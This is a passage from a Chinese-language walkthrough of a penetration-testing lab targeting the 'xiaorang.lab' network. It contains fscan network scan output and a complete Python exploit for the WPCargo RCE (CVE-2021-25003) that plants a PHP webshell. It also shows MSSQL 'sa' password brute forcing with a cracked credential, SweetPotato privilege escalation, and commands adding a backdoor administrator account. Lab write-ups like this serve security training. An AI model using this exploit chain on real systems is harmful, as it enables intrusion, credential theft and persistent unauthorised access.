+</span></span><span class="line"><span class="cl">./fscan -h 172.22.2.7/24  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">   ___                              _      
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __   
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /  
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;      
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>    
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.3  
+</span></span><span class="line"><span class="cl">start infoscan  
+</span></span><span class="line"><span class="cl">trying RunIcmp2  
+</span></span><span class="line"><span class="cl">The current user permissions unable to send icmp packets  
+</span></span><span class="line"><span class="cl">start ping  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.18     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.16     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.3      is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.7      is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.2.34     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">5</span>  
+</span></span><span class="line"><span class="cl">172.22.2.7:22 open  
+</span></span><span class="line"><span class="cl">172.22.2.7:21 open  
+</span></span><span class="line"><span class="cl">172.22.2.18:80 open  
+</span></span><span class="line"><span class="cl">172.22.2.7:80 open  
+</span></span><span class="line"><span class="cl">172.22.2.18:22 open  
+</span></span><span class="line"><span class="cl">172.22.2.7:6379 open  
+</span></span><span class="line"><span class="cl">172.22.2.3:88 open  
+</span></span><span class="line"><span class="cl">172.22.2.18:445 open  
+</span></span><span class="line"><span class="cl">172.22.2.16:1433 open  
+</span></span><span class="line"><span class="cl">172.22.2.34:445 open  
+</span></span><span class="line"><span class="cl">172.22.2.16:445 open  
+</span></span><span class="line"><span class="cl">172.22.2.3:445 open  
+</span></span><span class="line"><span class="cl">172.22.2.34:139 open  
+</span></span><span class="line"><span class="cl">172.22.2.16:139 open  
+</span></span><span class="line"><span class="cl">172.22.2.34:135 open  
+</span></span><span class="line"><span class="cl">172.22.2.3:139 open  
+</span></span><span class="line"><span class="cl">172.22.2.18:139 open  
+</span></span><span class="line"><span class="cl">172.22.2.16:135 open  
+</span></span><span class="line"><span class="cl">172.22.2.3:135 open  
+</span></span><span class="line"><span class="cl">172.22.2.16:80 open  
+</span></span><span class="line"><span class="cl">172.22.2.34:7680 open  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">21</span>  
+</span></span><span class="line"><span class="cl">start vulscan  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.16  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>MSSQLSERVER  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.16  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.3  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DC  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.3  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.2.3   <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.34     XIAORANG<span class="se">\C</span>LIENT01               
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.3      <span class="o">[</span>+<span class="o">]</span> DC:DC.xiaorang.lab               Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.2.34  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>CLIENT01  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.2.34  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.2.16  <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.16        code:404 len:315    title:Not Found  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.2.18     WORKGROUP<span class="se">\U</span>BUNTU-WEB02          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ftp 172.22.2.7:21:anonymous   
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>pub  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点  
+</span></span><span class="line"><span class="cl">已完成 21/21  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 扫描结束,耗时: 13.155899674s  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫描到一个<code>wordpress</code>站点<br>
+http://172.22.2.18/<br>
+存在<a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/"target="_blank" rel="external nofollow noopener noreferrer">WPCargo &lt; 6.9.0 – 未经身份验证的 RCE | CVE 2021-25003 | 插件漏洞</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1"># This is a magic string that when treated as pixels and compressed using the png  </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file  </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;</span><span class="si">{:08b}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">)])[</span><span class="mi">1</span><span class="p">:]</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">destination_url</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.2.18/&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1"># With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.  </span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">wp-content/plugins/wpcargo/includes/barcode.php?text=</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1"># We have uploaded a webshell - now let&#39;s use it to execute a command.  </span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">webshell.php?1=system&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>蚁剑连接<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>wp-config.php</code>中找到数据库账号和密码进行连接<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+找到第二个<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="flag03" class="heading-element"><span>flag03</span>
+  <a href="#flag03" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>还存在一个密码表,导出进行爆破其他主机的服务<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+通过<code>fscan</code>扫描结果，得知还有几台主机，其中<code>16</code>存在<code>mssql</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(icmp) Target 172.22.2.18     is alive  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.2.16     is alive  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.2.3      is alive  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.2.7      is alive  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.2.34     is alive  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里重点关注一下，利用<code>fscan</code>进行爆破一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>redis@centos-web01 tmp<span class="o">]</span>$ ./fscan -h 172.22.2.16 -m mssql -u sa -pwdf password.txt  
+</span></span><span class="line"><span class="cl">&lt;/fscan -h 172.22.2.16 -m mssql -u sa -pwdf password.txt                       
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">   ___                              _      
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __   
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /  
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;      
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>    
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.3  
+</span></span><span class="line"><span class="cl">-m  mssql  start scan the port: <span class="m">1433</span>  
+</span></span><span class="line"><span class="cl">start infoscan  
+</span></span><span class="line"><span class="cl">172.22.2.16:1433 open  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">1</span>  
+</span></span><span class="line"><span class="cl">start vulscan  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> mssql 172.22.2.16:1433:sa ElGNkOiC  
+</span></span><span class="line"><span class="cl">已完成 2/2  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 扫描结束,耗时: 945.630414ms  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到用户名和密码<br>
+<code>sa/ElGNkOiC</code>，利用<code>MDUT</code>进行利用<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+存在<code>SeImpersonatePrivilege</code>权限<br>
+这里，激活<code>OLE</code>组件，上传脏土豆进行提权<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="flag04" class="heading-element"><span>flag04</span>
+  <a href="#flag04" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>C:/Users/Public/SweetPotato-new.exe -a &quot;netstat -ano&quot;</code><br>
+<code>3389</code>是开启的状态，直接添加用户连<code>3389</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:/Users/Public/SweetPotato-new.exe -a &#34;net user huahua 123@qwer! /add&#34;  
+</span></span><span class="line"><span class="cl">C:/Users/Public/SweetPotato-new.exe -a &#34;net localgroup administrators huahua /add&#34;  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>systeminfo</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">systeminfo</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">主机名</span><span class="err">:</span>           <span class="n">MSSQLSERVER</span>  
+</span></span><span class="line"><span class="cl"><span class="n">OS</span> <span class="n">名称</span><span class="err">:</span>          <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mf">2016</span> <span class="n">Datacenter</span>  
+</span></span><span class="line"><span class="cl"><span class="n">OS</span> <span class="n">版本</span><span class="err">:</span>          <span class="mf">10.0</span><span class="p">.</span><span class="py">14393</span> <span class="n">暂缺</span> <span class="n">Build</span> <span class="mf">14393</span>  
+</span></span><span class="line"><span class="cl"><span class="n">OS</span> <span class="n">制造商</span><span class="err">:</span>        <span class="n">Microsoft</span> <span class="n">Corporation</span>  
+</span></span><span class="line"><span class="cl"><span class="n">OS</span> <span class="n">配置</span><span class="err">:</span>          <span class="n">成员服务器</span>  
+</span></span><span class="line"><span class="cl"><span class="n">OS</span> <span class="n">构件类型</span><span class="err">:</span>      <span class="n">Multiprocessor</span> <span class="n">Free</span>  
+</span></span><span class="line"><span class="cl"><span class="n">注册的所有人</span><span class="err">:</span>  
+</span></span><span class="line"><span class="cl"><span class="n">注册的组织</span><span class="err">:</span>       <span class="n">Aliyun</span>  
+</span></span><span class="line"><span class="cl"><span class="n">产品</span> <span class="n">ID</span><span class="err">:</span>          <span class="mf">00376</span><span class="p">-</span><span class="mf">40000</span><span class="p">-</span><span class="mf">00000</span><span class="n">-AA947</span>  
+</span></span><span class="line"><span class="cl"><span class="n">初始安装日期</span><span class="err">:</span>     <span class="mf">2022</span><span class="p">/</span><span class="mf">6</span><span class="p">/</span><span class="mf">8</span><span class="p">,</span> <span class="mf">16</span><span class="err">:</span><span class="mf">30</span><span class="err">:</span><span class="mf">01</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统启动时间</span><span class="err">:</span>     <span class="mf">2025</span><span class="p">/</span><span class="mf">4</span><span class="p">/</span><span class="mf">20</span><span class="p">,</span> <span class="mf">14</span><span class="err">:</span><span class="mf">13</span><span class="err">:</span><span class="mf">13</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统制造商</span><span class="err">:</span>       <span class="n">Alibaba</span> <span class="n">Cloud</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统型号</span><span class="err">:</span>         <span class="n">Alibaba</span> <span class="n">Cloud</span> <span class="n">ECS</span>  
+</span></span><span class="line"><span class="cl"><span class="n">系统类型</span><span class="err">:</span>         <span class="nb">x64-based</span> <span class="n">PC</span>  
+</span></span><span class="line"><span class="cl"><span class="n">处理器</span><span class="err">:</span>           <span class="n">安装了</span> <span class="mf">1</span> <span class="n">个处理器</span><span class="err">。</span>  
